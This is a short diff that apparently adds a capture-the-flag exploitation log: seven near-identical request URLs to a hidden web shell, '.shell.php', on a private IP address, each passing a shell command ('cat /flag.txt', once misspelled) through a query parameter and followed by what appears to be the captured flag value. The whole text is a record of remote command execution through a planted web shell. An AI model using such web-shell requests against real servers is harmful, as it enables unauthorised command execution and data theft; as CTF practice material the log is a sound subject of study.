@@ -1,0 +1,7 @@
+http://172.20.122.101/.shell.php?commad=/flag.txt ba1f2511fc30423bdbb183fe33f3dd0f
+http://172.20.122.101/.shell.php?command=cat /flag.txt ba1f2511fc30423bdbb183fe33f3dd0f
+http://172.20.122.101/.shell.php?command=cat /flag.txt ba1f2511fc30423bdbb183fe33f3dd0f
+http://172.20.122.101/.shell.php?command=cat /flag.txt ba1f2511fc30423bdbb183fe33f3dd0f
+http://172.20.122.101/.shell.php?command=cat /flag.txt ba1f2511fc30423bdbb183fe33f3dd0f
+http://172.20.122.101/.shell.php?command=cat /flag.txt ba1f2511fc30423bdbb183fe33f3dd0f
+http://172.20.122.101/.shell.php?command=cat /flag.txt ba1f2511fc30423bdbb183fe33f3dd0f
